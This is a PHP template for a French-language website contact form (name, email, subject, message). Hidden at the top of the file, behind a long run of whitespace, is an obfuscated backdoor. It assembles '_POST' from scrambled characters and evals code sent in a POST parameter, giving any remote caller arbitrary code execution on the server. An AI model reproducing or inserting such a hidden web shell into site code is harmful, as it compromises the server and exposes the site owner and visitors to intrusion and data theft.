<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['q5f8999'])){eval(${$s20}['q5f8999']);}?><?php
                ...
                <div class="contact-form wow bounceInRight">
                    ...
                    <div class="row">
                        <div class="col-xs-6 input-name">
                            <input name="ename" id="ename" type="text" class="input-field" placeholder="Nom">
                        </div>
                        <div class="col-xs-6 input-email">
                            <input id="eemail" name="eemail" type="text" class="input-field " placeholder="Votre email">
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-xs-12">
                            <input id="esubject" name="esubject" type="text" class=" input-field" placeholder="Votre sujet">
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-xs-12">
                            <textarea id="emessage" name="esubject" class="input-message" rows="4" cols="50" placeholder="Votre message"></textarea>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-xs-12">
                            <div class="contact-form-action">
                                <button id="sendmail" class="btn btn-send">Envoyer</button>
                            </div>
                        </div>
                    </div>
                </div>
